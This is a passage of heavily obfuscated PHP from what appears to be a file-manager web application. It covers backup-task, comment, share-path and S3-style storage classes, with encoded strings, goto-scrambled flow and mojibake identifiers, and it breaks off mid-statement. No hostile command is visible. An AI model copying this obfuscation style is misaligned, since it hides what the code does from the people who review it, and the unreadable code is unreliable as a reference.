$Aå®êÊ§°); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\155\56\142\141\143\153\x75\x70\x4c\x69\163\164"; public $field = array("\x69\x6f", "\x6e\x61\x6d\x65", "\163\x74\x61\164\165\163", "\143\157\x6e\x74\x65\x6e\x74", "\162\x65\163\x75\x6c\164", "\164\151\x6d\145\x46\x72\x6f\155", "\x74\151\x6d\145\x54\x6f"); public function config() { goto eÌˆ§®Éµè; EªÄº‡ãïê: if (isset($E“®Îö„´[$Aá™ÎğÈÊÊ[195]])) { $E“®Îö„´[$Aá™ÎğÈÊÊ[195]] = json_decode($E“®Îö„´[$Aá™ÎğÈÊÊ[195]], !0); } if (isset($cøµ°ÛÍá[$Aá™ÎğÈÊÊ[195]])) { $E“®Îö„´[$Aá™ÎğÈÊÊ[195]][$Aá™ÎğÈÊÊ[1478]] = $cøµ°ÛÍá[$Aá™ÎğÈÊÊ[195]]; unset($cøµ°ÛÍá[$Aá™ÎğÈÊÊ[195]]); } return array_merge($E“®Îö„´, $cøµ°ÛÍá); goto CÜ¨îÏ¥; eÌˆ§®Éµè: $Aá™ÎğÈÊÊ =& $_SERVER[¹Ò‹Ò¹]; $cøµ°ÛÍá = Model($Aá™ÎğÈÊÊ[1099])->get($Aá™ÎğÈÊÊ[728]); $cøµ°ÛÍá = json_decode($cøµ°ÛÍá, !0); goto a¹ÚÁ—¢‘Ã; câ¯ğãïç‹: Action($Aá™ÎğÈÊÊ[1691])->taskInit(); $FëÕ‡¨ÊÀƒ = Model($Aá™ÎğÈÊÊ[1692])->listData(); foreach ($FëÕ‡¨ÊÀƒ as $fÉŒï‰†“ß) { if ($fÉŒï‰†“ß[$Aá™ÎğÈÊÊ[1144]] == $Aá™ÎğÈÊÊ[86] && $fÉŒï‰†“ß[$Aá™ÎğÈÊÊ[1493]] == $Aá™ÎğÈÊÊ[1693]) { $E“®Îö„´ = $fÉŒï‰†“ß; break; } } goto EªÄº‡ãïê; a¹ÚÁ—¢‘Ã: $cøµ°ÛÍá = is_array($cøµ°ÛÍá) ? $cøµ°ÛÍá : array(); if (!isset($cøµ°ÛÍá[$Aá™ÎğÈÊÊ[707]])) { $cøµ°ÛÍá[$Aá™ÎğÈÊÊ[707]] = $Aá™ÎğÈÊÊ[86]; } $E“®Îö„´ = array(); goto câ¯ğãïç‹; CÜ¨îÏ¥: } public function listData($Aï§‘×‘´ = false, $e§É–ƒËâÚ = "\155\x6f\x64\x69\146\171\124\151\x6d\145", $bÈ¥†‹ÙÃ = false) { return parent::listData($Aï§‘×‘´, $e§É–ƒËâÚ, !0); } public function lastItem() { $Bí¼ìáßï = $this->listData(); return !empty($Bí¼ìáßï[0]) ? $Bí¼ìáßï[0] : null; } public function kill($DÅÎ›¦ŠÇ™) { goto a·š•ß»Ä¼; CØÚ«ÒÑĞ”: Task::kill($a°“éÇƒ•[727]); Task::kill($a°“éÇƒ•[746]); Task::kill($a°“éÇƒ•[755]); goto C£–İ¦À“ó; cË©Ãøßğ: return $this->remove($DÅÎ›¦ŠÇ™); goto Dïá²Òù™Ê; a·š•ß»Ä¼: $a°“éÇƒ• =& $_SERVER[¹Ò‹Ò¹]; $cÍøÔ‹à„î = $this->listData($DÅÎ›¦ŠÇ™); if (!$cÍøÔ‹à„î || empty($cÍøÔ‹à„î[$a°“éÇƒ•[28]])) { return !0; } goto CØÚ«ÒÑĞ”; C£–İ¦À“ó: $d«Çƒ…Í = $cÍøÔ‹à„î[$a°“éÇƒ•[28]]; $E²İ¡¹‹Œ† = TEMP_FILES . $a°“éÇƒ•[724] . $d«Çƒ…Í . $a°“éÇƒ•[8]; IO::remove($E²İ¡¹‹Œ†, !1); goto cË©Ãøßğ; Dïá²Òù™Ê: } public function remove($B‚İÇÔÀ‘) { $b¿¾†ø§Œ = $this->listData($B‚İÇÔÀ‘); if (!$b¿¾†ø§Œ) { return !0; } return $this->backupRemove($b¿¾†ø§Œ); } private function backupRemove($d—¸ò†²±) { $DàÃ×‹Øß’ =& $_SERVER[¹Ò‹Ò¹]; parent::remove($d—¸ò†²±[$DàÃ×‹Øß’[388]]); $cÛÅ°·ÚÜ = "\x7b\x69\x6f\72{$d—¸ò†²±[$DàÃ×‹Øß’[706]]}\x7d\x2f\x64\141\164\141\142\x61\163\145\x2f\142\x61\x63\x6b\165\160\x5f" . $d—¸ò†²±[$DàÃ×‹Øß’[28]]; IO::remove($cÛÅ°·ÚÜ, !1); return !0; } public function start() { goto EİÔ‘ïÚàï; BÇ˜ŒÙ¬Â: if ($C˜–ˆóÔ×) { $C˜–ˆóÔ× = $F‰É¼¶Á´³->dbFile(); if ($C˜–ˆóÔ× && $eßˆÉ»î´¦[$cµòÇïÕ[707]] == $cµòÇïÕ[491]) { $C˜–ˆóÔ× = $F‰É¼¶Á´³->file(); } } Backup::set(array($cµòÇïÕ[704] => 1, $cµòÇïÕ[470] => time())); return !0; goto AÑ¥˜¬Ç’; d‰ô½îæÈÕ: if (!$eßˆÉ»î´¦ || $eßˆÉ»î´¦[$cµòÇïÕ[1475]] != $cµòÇïÕ[86]) { return !1; } $FÉñíˆéºö = $this->process(); foreach ($FÉñíˆéºö as $f¹š®Ş°¸) { if ($f¹š®Ş°¸) { return Task::restart($f¹š®Ş°¸[$cµòÇïÕ[388]]); } } goto A–Öš»½ª; EİÔ‘ïÚàï: $cµòÇïÕ =& $_SERVER[¹Ò‹Ò¹]; if ($GLOBALS[$cµòÇïÕ[6]][$cµòÇïÕ[87]][$cµòÇïÕ[1694]] != $cµòÇïÕ[86]) { return !0; } $eßˆÉ»î´¦ = $this->config(); goto d‰ô½îæÈÕ; A–Öš»½ª: $F‰É¼¶Á´³ = new Backup(); $F‰É¼¶Á´³->keep(); $C˜–ˆóÔ× = $F‰É¼¶Á´³->db(); goto BÇ˜ŒÙ¬Â; AÑ¥˜¬Ç’: } public function process() { $B‘œŒĞÍ¿ =& $_SERVER[¹Ò‹Ò¹]; return array($B‘œŒĞÍ¿[709] => Task::get($B‘œŒĞÍ¿[727]), $B‘œŒĞÍ¿[712] => Task::get($B‘œŒĞÍ¿[746]), $B‘œŒĞÍ¿[191] => Task::get($B‘œŒĞÍ¿[755])); } public function restore() { $aÅä»óö²È =& $_SERVER[¹Ò‹Ò¹]; ActionCall($aÅä»óö²È[994], !0, 1); ActionCall($aÅä»óö²È[994], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\x6d\x65\156\x74"; protected $tableMeta = array("\164\x61\142\154\x65\x4e\141\x6d\145" => "\x63\x6f\155\155\x65\156\x74\x5f\x6d\145\164\x61", "\x6d\145\164\141\106\151\145\x6c\x64" => "\x63\157\x6d\155\145\156\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Dæ«ÑèåÆ) { $Dø×…±Õë =& $_SERVER[¹Ò‹Ò¹]; if ($Dæ«ÑèåÆ[$Dø×…±Õë[1695]]) { $BÆ¸­Ğîö¬ = $this->where(array($Dø×…±Õë[1696] => $Dæ«ÑèåÆ[$Dø×…±Õë[1695]]))->find(); if (!$BÆ¸­Ğîö¬ || $BÆ¸­Ğîö¬[$Dø×…±Õë[398]] != $Dæ«ÑèåÆ[$Dø×…±Õë[398]] || $BÆ¸­Ğîö¬[$Dø×…±Õë[478]] != $Dæ«ÑèåÆ[$Dø×…±Õë[478]]) { return !1; } $this->where(array($Dø×…±Õë[1696] => $Dæ«ÑèåÆ[$Dø×…±Õë[1695]]))->setAdd($Dø×…±Õë[1697], 1); } $Dæ«ÑèåÆ[$Dø×…±Õë[1698]] = 0; $Dæ«ÑèåÆ[$Dø×…±Õë[1697]] = 0; $Dæ«ÑèåÆ[$Dø×…±Õë[704]] = 1; return $this->add($Dæ«ÑèåÆ); } public function commentCount($F‰îÉÅ†É“, $fÇÎ÷ÅÎÛ) { goto C®±ö©½†Ù; f·Úï„ÊèÒ: $C¹¥²¿èŠ = array($BºÁÁ‡´óé[478], $BºÁÁ‡´óé[1699] => $BºÁÁ‡´óé[474]); $d¶İƒ÷‹²¹ = array($BºÁÁ‡´óé[478] => array($BºÁÁ‡´óé[7], $F‰îÉÅ†É“), $BºÁÁ‡´óé[398] => $fÇÎ÷ÅÎÛ); $A‰÷¿Ñâ = $this->field($C¹¥²¿èŠ)->where($d¶İƒ÷‹²¹)->group($BºÁÁ‡´óé[478])->select(); goto Ašğ¨Ó³Œ©; C®±ö©½†Ù: $BºÁÁ‡´óé =& $_SERVER[¹Ò‹Ò¹]; if (!$F‰îÉÅ†É“) { return array(); } if (is_string($F‰îÉÅ†É“) || is_int($F‰îÉÅ†É“)) { $F‰îÉÅ†É“ = array($F‰îÉÅ†É“); } goto f·Úï„ÊèÒ; Ašğ¨Ó³Œ©: return array_to_keyvalue($A‰÷¿Ñâ, $BºÁÁ‡´óé[478], $BºÁÁ‡´óé[474]); goto d•Ü‹Í¸Ñç; d•Ü‹Í¸Ñç: } public function remove($dö½…ØËğ) { $BÊ¶²ËµÇ =& $_SERVER[¹Ò‹Ò¹]; $a“Çì–•Í = array($BÊ¶²ËµÇ[1696] => $dö½…ØËğ); $AÒ¤ŞøÉè™ = $this->where($a“Çì–•Í)->find(); if ($AÒ¤ŞøÉè™[$BÊ¶²ËµÇ[1695]]) { $this->where(array($BÊ¶²ËµÇ[1696] => $AÒ¤ŞøÉè™[$BÊ¶²ËµÇ[1695]]))->setAdd($BÊ¶²ËµÇ[1697], -1); } return $this->where($a“Çì–•Í)->delete(); } public function edit($C¿³‘†ÊÒ¡, $b©Æ¶¦Ò¾ô) { $CèŒ°ãÙœ‘ =& $_SERVER[¹Ò‹Ò¹]; $F¡Ğ‹ÄóùŠ = array($CèŒ°ãÙœ‘[1696] => $C¿³‘†ÊÒ¡); return $this->where($F¡Ğ‹ÄóùŠ)->save(array($CèŒ°ãÙœ‘[1700] => $b©Æ¶¦Ò¾ô)); } public function prasise($DƒëÊÖ ¥ª) { $F’‰ „®Î÷ =& $_SERVER[¹Ò‹Ò¹]; $AÛŠÄÀĞ©˜ = Model($F’‰ „®Î÷[1701]); $eÆ‡¤çõ«‰ = array($F’‰ „®Î÷[1696] => $DƒëÊÖ ¥ª, $F’‰ „®Î÷[1496] => USER_ID); $BÔ¿¬İÁË = $AÛŠÄÀĞ©˜->where($eÆ‡¤çõ«‰)->find(); if (!$BÔ¿¬İÁË) { $AÛŠÄÀĞ©˜->add($eÆ‡¤çõ«‰); $dæªÛë¾Ç = $this->where(array($F’‰ „®Î÷[1696] => $DƒëÊÖ ¥ª))->setAdd($F’‰ „®Î÷[1698], 1); } else { $AÛŠÄÀĞ©˜->where($eÆ‡¤çõ«‰)->delete(); $dæªÛë¾Ç = $this->where(array($F’‰ „®Î÷[1696] => $DƒëÊÖ ¥ª))->setAdd($F’‰ „®Î÷[1698], -1); } return $dæªÛë¾Ç; } public function targetInfo($aæ¨¼¼™ïä, $eêÜ¹ÚÄëğ) { goto d¼íÔğä•; a®¢¾âË†Ğ: $c×ÍÜ¸†Û = "\122\x49\107\110\x54\x20\112\x4f\x49\116\x20{$this->tablePrefix}\x63\157\x6d\155\x65\156\164\137\160\162\141\x69\163\145\x20\163\x74\x61\162\x20\x6f\x6e\x20\143\x6f\155\155\145\156\164\56\143\x6f\x6d\x6d\145\156\x74\111\x44\x20\x3d\x20\x73\164\x61\x72\x2e\143\x6f\155\155\x65\x6e\x74\x49\x44"; $f™ší¦Àìœ = $this->alias($cµ¨Æ‚‘ÑÇ[350])->where($dÎáñŠ‹ )->join($c×ÍÜ¸†Û, $cµ¨Æ‚‘ÑÇ[1702])->count(); $bÂ˜ªìŠçã = array($cµ¨Æ‚‘ÑÇ[1703] => $DÃ–¹œš¹À, $cµ¨Æ‚‘ÑÇ[1704] => $f™ší¦Àìœ); goto fÍïÙ¹ï×Š; d¼íÔğä•: $cµ¨Æ‚‘ÑÇ =& $_SERVER[¹Ò‹Ò¹]; $dÎáñŠ‹  = array($cµ¨Æ‚‘ÑÇ[544] => $aæ¨¼¼™ïä, $cµ¨Æ‚‘ÑÇ[545] => $eêÜ¹ÚÄëğ); $DÃ–¹œš¹À = $this->where($dÎáñŠ‹ )->count(); goto a®¢¾âË†Ğ; fÍïÙ¹ï×Š: return $bÂ˜ªìŠçã; goto aáîÃ¸ìâ†; aáîÃ¸ìâ†: } public function listData($dÁ˜İğšˆ) { $Cğˆç÷‡îÕ =& $_SERVER[¹Ò‹Ò¹]; if (isset($dÁ˜İğšˆ[$Cğˆç÷‡îÕ[1705]])) { if ($dÁ˜İğšˆ[$Cğˆç÷‡îÕ[1705]]) { $dÁ˜İğšˆ[$Cğˆç÷‡îÕ[1706]] = array($Cğˆç÷‡îÕ[947], intval($dÁ˜İğšˆ[$Cğˆç÷‡îÕ[1705]])); } unset($dÁ˜İğšˆ[$Cğˆç÷‡îÕ[1705]]); } if (isset($dÁ˜İğšˆ[$Cğˆç÷‡îÕ[1707]])) { if ($dÁ˜İğšˆ[$Cğˆç÷‡îÕ[1707]]) { $dÁ˜İğšˆ[$Cğˆç÷‡îÕ[1706]] = array($Cğˆç÷‡îÕ[944], intval($dÁ˜İğšˆ[$Cğˆç÷‡îÕ[1707]])); } unset($dÁ˜İğšˆ[$Cğˆç÷‡îÕ[1707]]); } return $this->_listData($dÁ˜İğšˆ); } private function _listData($cÜãì˜Ó®¶) { $c‚ŞÄƒÕèÈ =& $_SERVER[¹Ò‹Ò¹]; $cŒƒÓ•¶Ìæ = $this->where($cÜãì˜Ó®¶)->_makeOrder()->selectPage(100); $this->_listAppendParent($cŒƒÓ•¶Ìæ[$c‚ŞÄƒÕèÈ[365]]); $this->_listAppendUser($cŒƒÓ•¶Ìæ[$c‚ŞÄƒÕèÈ[365]]); $this->_listAppendMeta($cŒƒÓ•¶Ìæ[$c‚ŞÄƒÕèÈ[365]]); return $cŒƒÓ•¶Ìæ; } private function _makeOrder() { $D•Ğ±ïøâ˜ =& $_SERVER[¹Ò‹Ò¹]; $bªËµ¬Ùê­ = array($D•Ğ±ïøâ˜[1698], $D•Ğ±ïøâ˜[1697], $D•Ğ±ïøâ˜[192]); $a ªÎ™ëÁÏ = Input::get($D•Ğ±ïøâ˜[429], $D•Ğ±ïøâ˜[7], $D•Ğ±ïøâ˜[410], $bªËµ¬Ùê­); $fö¿ç„áÊ = Input::get($D•Ğ±ïøâ˜[430], $D•Ğ±ïøâ˜[7], $D•Ğ±ïøâ˜[1498], array($D•Ğ±ïøâ˜[1708], $D•Ğ±ïøâ˜[425])); $BÉŞ×ò½õ‚ = $a ªÎ™ëÁÏ . $D•Ğ±ïøâ˜[50] . $fö¿ç„áÊ; return $this->order($BÉŞ×ò½õ‚); } private function _listAppendParent(&$b†‹»¯‡) { goto F‚¾£‰‚Ê«; dÊœøªô‹: foreach ($b†‹»¯‡ as &$eÌŠËº¥±) { if (isset($d›ô‰¢ÛĞß[$eÌŠËº¥±[$B®Ÿ£Ñ¡²†[1695]]])) { $eÌŠËº¥±[$B®Ÿ£Ñ¡²†[1709]] = $d›ô‰¢ÛĞß[$eÌŠËº¥±[$B®Ÿ£Ñ¡²†[1695]]]; } } unset($eÌŠËº¥±); goto fµÍæµÖ ; d«„ñ»›Î: if (!$Böƒ†¼ÂŠÀ) { return; } $d›ô‰¢ÛĞß = $this->where(array($B®Ÿ£Ñ¡²†[1696] => array($B®Ÿ£Ñ¡²†[7], $Böƒ†¼ÂŠÀ)))->select(); $d›ô‰¢ÛĞß = array_to_keyvalue($d›ô‰¢ÛĞß, $B®Ÿ£Ñ¡²†[1706]); goto dÊœøªô‹; F‚¾£‰‚Ê«: $B®Ÿ£Ñ¡²† =& $_SERVER[¹Ò‹Ò¹]; $Böƒ†¼ÂŠÀ = array_unique(array_to_keyvalue($b†‹»¯‡, $B®Ÿ£Ñ¡²†[33], $B®Ÿ£Ñ¡²†[1695])); $Böƒ†¼ÂŠÀ = array_remove_value($Böƒ†¼ÂŠÀ, $B®Ÿ£Ñ¡²†[491]); goto d«„ñ»›Î; fµÍæµÖ : } private function _listAppendUser(&$FåŒæÌ„·Á) { goto fŒÄ†á™½; fŒÄ†á™½: $DË‚×Á¿œ =& $_SERVER[¹Ò‹Ò¹]; $f®×¯ùÜåÔ = array_unique(array_to_keyvalue($FåŒæÌ„·Á, $DË‚×Á¿œ[33], $DË‚×Á¿œ[1504])); $f®×¯ùÜåÔ = array_remove_value($f®×¯ùÜåÔ, $DË‚×Á¿œ[491]); goto bŸÉ†é¹¾; e‹õ‘´ëÖ»: foreach ($FåŒæÌ„·Á as &$b©ÈîŞ…•) { $b©ÈîŞ…•[$DË‚×Á¿œ[557]] = $FØ°± ´[$b©ÈîŞ…•[$DË‚×Á¿œ[1504]]]; if (isset($b©ÈîŞ…•[$DË‚×Á¿œ[1709]])) { $b©ÈîŞ…•[$DË‚×Á¿œ[1709]][$DË‚×Á¿œ[557]] = $FØ°± ´[$b©ÈîŞ…•[$DË‚×Á¿œ[1709]][$DË‚×Á¿œ[1504]]]; } } unset($b©ÈîŞ…•); goto CìÈ÷„×ø­; bŸÉ†é¹¾: if (count($f®×¯ùÜåÔ) == 0) { return; } foreach ($FåŒæÌ„·Á as $b©ÈîŞ…•) { if (isset($b©ÈîŞ…•[$DË‚×Á¿œ[1709]])) { $f®×¯ùÜåÔ[] = $b©ÈîŞ…•[$DË‚×Á¿œ[1709]][$DË‚×Á¿œ[1504]]; } } $FØ°± ´ = Model($DË‚×Á¿œ[501])->userListInfo($f®×¯ùÜåÔ); goto e‹õ‘´ëÖ»; CìÈ÷„×ø­: } private function _listAppendMeta(&$C“ÜäØÕá) { goto EÏˆ»ã”ªé; FöÛ„§çµÈ: if (!$a»Ø˜˜¨×ñ) { return !1; } foreach ($C“ÜäØÕá as &$fµ®¶›åë”) { $fµ®¶›åë”[$E‰í„¯šº [439]] = $a»Ø˜˜¨×ñ[$fµ®¶›åë”[$E‰í„¯šº [1706]]]; if (isset($fµ®¶›åë”[$E‰í„¯šº [1709]])) { $fµ®¶›åë”[$E‰í„¯šº [1709]][$E‰í„¯šº [439]] = $a»Ø˜˜¨×ñ[$fµ®¶›åë”[$E‰í„¯šº [1709]][$E‰í„¯šº [1706]]]; } } unset($fµ®¶›åë”); goto c¥åëğ°×¾; dªê»•Åø: if (!$f‰à´¥¥”½) { return; } foreach ($C“ÜäØÕá as $fµ®¶›åë”) { if (isset($fµ®¶›åë”[$E‰í„¯šº [1709]])) { $f‰à´¥¥”½[] = $fµ®¶›åë”[$E‰í„¯šº [1709]][$E‰í„¯šº [1706]]; } } $a»Ø˜˜¨×ñ = $this->metaList($f‰à´¥¥”½); goto FöÛ„§çµÈ; EÏˆ»ã”ªé: $E‰í„¯šº  =& $_SERVER[¹Ò‹Ò¹]; $f‰à´¥¥”½ = array_unique(array_to_keyvalue($C“ÜäØÕá, $E‰í„¯šº [33], $E‰í„¯šº [1706])); $f‰à´¥¥”½ = array_remove_value($f‰à´¥¥”½, $E‰í„¯šº [491]); goto dªê»•Åø; c¥åëğ°×¾: } private function metaList($eƒ°§Œ¤„ê) { goto Eæš¸í¼²; CåÓÓ»òá: return $cïíÃŒËáô ? $cïíÃŒËáô : array(); goto fÈ†î«ƒõ; D¢ŒÃğ‘»Ä: $cïíÃŒËáô = Model($cŸšÉÕë©ï[1710])->where($fòÚ‰Çà)->select(); $cïíÃŒËáô = array_to_keyvalue_group($cïíÃŒËáô, $cŸšÉÕë©ï[1706]); foreach ($cïíÃŒËáô as $cÚ»²¡åŒĞ => $b•¾â‘Ê) { $Eè‘¬¡ÍŸ’ = array(); foreach ($b•¾â‘Ê as $d¿ô£‰½ª«) { $Eè‘¬¡ÍŸ’[$d¿ô£‰½ª«[$cŸšÉÕë©ï[92]]] = $d¿ô£‰½ª«[$cŸšÉÕë©ï[370]]; } $cïíÃŒËáô[$cÚ»²¡åŒĞ] = $Eè‘¬¡ÍŸ’; } goto CåÓÓ»òá; Eæš¸í¼²: $cŸšÉÕë©ï =& $_SERVER[¹Ò‹Ò¹]; if (!$eƒ°§Œ¤„ê) { return array(); } $fòÚ‰Çà = array($cŸšÉÕë©ï[1706] => array($cŸšÉÕë©ï[7], $eƒ°§Œ¤„ê)); goto D¢ŒÃğ‘»Ä; fÈ†î«ƒõ: } } goto b”Á»«Š—; fö¥è…‡á: class PathDriverDriverShareItem { public function __construct($E¬²â«º›) { $this->pathParse = $E¬²â«º›; } public function __call($aŒßœ¤ù«…, $fÉÑ«ì±ÍÚ) { $EİÇéˆ°Æ =& $_SERVER[¹Ò‹Ò¹]; if (method_exists($this, $aŒßœ¤ù«…)) { return; } $C‚Ñ½ˆÎ¸” = call_user_func_array(array($EİÇéˆ°Æ[1190], $aŒßœ¤ù«…), $fÉÑ«ì±ÍÚ); $Fê×ù’âÊœ = array($EİÇéˆ°Æ[1191], $EİÇéˆ°Æ[1192], $EİÇéˆ°Æ[1193], $EİÇéˆ°Æ[1194], $EİÇéˆ°Æ[513], $EİÇéˆ°Æ[515], $EİÇéˆ°Æ[1195], $EİÇéˆ°Æ[106], $EİÇéˆ°Æ[1196], $EİÇéˆ°Æ[1197]); if (in_array($aŒßœ¤ù«…, $Fê×ù’âÊœ)) { $C‚Ñ½ˆÎ¸” = $this->getPathOuter($C‚Ñ½ˆÎ¸”); } return $C‚Ñ½ˆÎ¸”; } public function copy($DÁÔ” ÅØ, $EÛÁÀ¡ôÑ˜, $d”§óºè†Ë = false) { return $this->copyMove($DÁÔ” ÅØ, $EÛÁÀ¡ôÑ˜, $d”§óºè†Ë, $_SERVER[¹Ò‹Ò¹][513]); } public function move($a‰¹…µ¨Ç×, $Cˆ…âçº², $f–¿Ë×™öË = false) { return $this->copyMove($a‰¹…µ¨Ç×, $Cˆ…âçº², $f–¿Ë×™öË, $_SERVER[¹Ò‹Ò¹][515]); } private function copyMove($Cßğ‚”Ø÷ß, $bÏ¨¯–¬Ç°, $D¹ÀËõ„«­, $CŒÇÌ¦‚Ü°) { goto f§±ğó›Ú¼; f§±ğó›Ú¼: $BÜ¥‹²öÚ =& $_SERVER[¹Ò‹Ò¹]; $cÌ‚ÛˆéÈí = $bÏ¨¯–¬Ç°; $D¤‹×›øÊ— = IO::driverMake($bÏ¨¯–¬Ç°); goto AãÉø¼¾’ƒ; AãÉø¼¾’ƒ: if ($D¤‹×›øÊ—->pathParse[$BÜ¥‹²öÚ[1023]]) { $bÏ¨¯–¬Ç° = $D¤‹×›øÊ—->pathParse[$BÜ¥‹²öÚ[1023]]; } else { $bÏ¨¯–¬Ç° = $cÌ‚ÛˆéÈí; } $f’Î¯é¤ç  = IO::copyMove($Cßğ‚”Ø÷ß, $bÏ¨¯–¬Ç°, $D¹ÀËõ„«­, $CŒÇÌ¦‚Ü°); $f’Î¯é¤ç  = $this->getPathOuter($f’Î¯é¤ç ); goto D¤…¦§ÅÑ; D¤…¦§ÅÑ: return $f’Î¯é¤ç ; goto B­Ê³Â”áØ; B­Ê³Â”áØ: } public function pathThis($eÛÉÛÅµïç) { return get_path_this($this->pathParse[$_SERVER[¹Ò‹Ò¹][75]]); } public function pathFather($DšÕ¹İ…àö) { return get_path_father($this->pathParse[$_SERVER[¹Ò‹Ò¹][75]]); } public function iconvSystem($b™Ë˜‚‹) { return $b™Ë˜‚‹; } protected function infoParse($Fóì²¦œ‚é, $FŸ÷äÖ¬Ä† = false) { $E—óÇÏ˜×¬ =& $_SERVER[¹Ò‹Ò¹]; $AµÅÄÍ¤ = $this->pathParse[$E—óÇÏ˜×¬[460]][$E—óÇÏ˜×¬[1046]] . $this->pathParse[$E—óÇÏ˜×¬[1039]]; if ($FŸ÷äÖ¬Ä†) { $a»‘¬“ã×Ü = IO::infoWithChildren($AµÅÄÍ¤); } else { $a»‘¬“ã×Ü = IO::info($AµÅÄÍ¤); } $f†Äë«Ô“· = $this->pathParse[$E—óÇÏ˜×¬[460]]; return Action($E—óÇÏ˜×¬[1188])->_shareItemeParse($a»‘¬“ã×Ü, $f†Äë«Ô“·); } public function listAll($cÅøˆ–Ä­) { $aÚ‘ˆá¡Ã =& $_SERVER[¹Ò‹Ò¹]; $fàñµ±è° = IO::listAll($cÅøˆ–Ä­); $eá©‚Å›‘ = $this->pathParse[$aÚ‘ˆá¡Ã[460]]; foreach ($fàñµ±è° as &$Fêå½ĞÒ¿¿) { check_abort(); $AÙîÂ…˜Úã = IO::info($Fêå½ĞÒ¿¿[$aÚ‘ˆá¡Ã[75]]); $AÙîÂ…˜Úã = is_array($AÙîÂ…˜Úã) ? $AÙîÂ…˜Úã : array(); $Fêå½ĞÒ¿¿ = array_merge($AÙîÂ…˜Úã, $Fêå½ĞÒ¿¿); $Fêå½ĞÒ¿¿[$aÚ‘ˆá¡Ã[84]] = Action($aÚ‘ˆá¡Ã[1188])->_shareItemeParse($Fêå½ĞÒ¿¿, $eá©‚Å›‘); } unset($Fêå½ĞÒ¿¿); return $fàñµ±è°; } public function getPathOuter($b†š§œÇ–Ï) { goto d‚¤‡«àì; aæÙë…äñÕ: if (substr($d‹ßœãª˜ª, 0, strlen($bÎ†±‚óÁŸ)) != $bÎ†±‚óÁŸ) { return !1; } return $this->pathParse[$dòØŒ¿êô„[1040]] . $dòØŒ¿êô„[8] . ltrim($eŒ×Š’Ö ß, $dòØŒ¿êô„[8]); goto dÍÖªÜª™; d‚¤‡«àì: $dòØŒ¿êô„ =& $_SERVER[¹Ò‹Ò¹]; $cˆæ‹ø©Ç® = KodIO::parse($b†š§œÇ–Ï); if ($cˆæ‹ø©Ç®[$dòØŒ¿êô„[29]] == KodIO::KOD_SHARE_ITEM) { return $cˆæ‹ø©Ç®[$dòØŒ¿êô„[75]]; } goto C°˜öãÍŸì; C°˜öãÍŸì: $d‹ßœãª˜ª = KodIO::clear($b†š§œÇ–Ï); $bÎ†±‚óÁŸ = KodIO::clear($this->pathParse[$dòØŒ¿êô„[460]][$dòØŒ¿êô„[1046]]); $eŒ×Š’Ö ß = substr($d‹ßœãª˜ª, strlen($bÎ†±‚óÁŸ)); goto aæÙë…äñÕ; dÍÖªÜª™: } public function getType() { $cÌ„ÕÛ¶œõ =& $_SERVER[¹Ò‹Ò¹]; $d›Ê´´ˆªí = str_replace($cÌ„ÕÛ¶œõ[71], $cÌ„ÕÛ¶œõ[33], get_class($this)); return strtolower($d›Ê´´ˆªí); } public function isTypeObject($aïŒ”£Š‚§) { return IO::isTypeObject($aïŒ”£Š‚§); } public function info($e¯‘™À«„½) { return $this->infoParse($e¯‘™À«„½); } public function infoAuth($bÊ¥”¯µëİ) { return $this->infoParse($bÊ¥”¯µëİ); } public function infoWithChildren($eŠä¬ò‚Òæ) { return $this->infoParse($eŠä¬ò‚Òæ, !0); } public function infoFull($f½‚šÚäÕø) { return $this->infoParse($f½‚šÚäÕø); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($dÙğ¼ÒÑÁæ) { $this->pathParse = $dÙğ¼ÒÑÁæ; } protected function infoParse($Bº¶áŒ¬íå, $BâÒ¢æªë = false) { $DšÃö¤Õæ… =& $_SERVER[¹Ò‹Ò¹]; return Action($DšÃö¤Õæ…[1045])->sharePathInfo($this->pathParse[$DšÃö¤Õæ…[75]], !0, $BâÒ¢æªë); } public function listPath($d‘¨‚öŠ°, $D‰¤ºÂÓ¹Í = false) { $F´ê£ôÉÕ =& $_SERVER[¹Ò‹Ò¹]; $fîàĞ±ÁŠñ = IO::listPath($d‘¨‚öŠ°, $D‰¤ºÂÓ¹Í); foreach ($fîàĞ±ÁŠñ as $F§ØÌšÊƒ¼ => $B¹§ÜÕ¢Š¦) { if (!in_array($F§ØÌšÊƒ¼, array($F´ê£ôÉÕ[73], $F´ê£ôÉÕ[74]))) { continue; } foreach ($B¹§ÜÕ¢Š¦ as $e­‡‚Ê½è => $eˆ¨ºá¨ó§) { $eˆ¨ºá¨ó§ = Action($F´ê£ôÉÕ[1198])->parsePathChildren($eˆ¨ºá¨ó§, array($F´ê£ôÉÕ[408] => $d‘¨‚öŠ°)); $fîàĞ±ÁŠñ[$F§ØÌšÊƒ¼][$e­‡‚Ê½è] = Action($F´ê£ôÉÕ[1045])->shareItemInfo($eˆ¨ºá¨ó§); } } return $fîàĞ±ÁŠñ; } public function listAll($fó ã™ÎÙö) { $Aµ– ±¸Š =& $_SERVER[¹Ò‹Ò¹]; $DÒŸ¿´¨¿ = IO::listAll($fó ã™ÎÙö); foreach ($DÒŸ¿´¨¿ as &$D«ÑÌ–Ì´õ) { $Bòîä¸•ğ¢ = IO::info($D«ÑÌ–Ì´õ[$Aµ– ±¸Š[75]]); $Bòîä¸•ğ¢ = is_array($Bòîä¸•ğ¢) ? $Bòîä¸•ğ¢ : array(); $D«ÑÌ–Ì´õ = array_merge($Bòîä¸•ğ¢, $D«ÑÌ–Ì´õ); $D«ÑÌ–Ì´õ[$Aµ– ±¸Š[84]] = Action($Aµ– ±¸Š[1045])->shareItemInfo($D«ÑÌ–Ì´õ); } unset($D«ÑÌ–Ì´õ); return $DÒŸ¿´¨¿; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($FßŠ–½âšÈ) { parent::__construct($FßŠ–½âšÈ); $this->signatureVersion($_SERVER[¹Ò‹Ò¹][210]); } public function uploadFormData($cÓï©­á·Ö, $eå¯É×öîŠ = 3600) { goto DÛöó•ç¯; AøÈæŠØßÊ: $A×Ú†ßŒ = $F—ô¦·ÙÑù[59]; $f‚°Ê¾Û£ = gmdate($F—ô¦·ÙÑù[1200]); $dßßÕµßÀ = 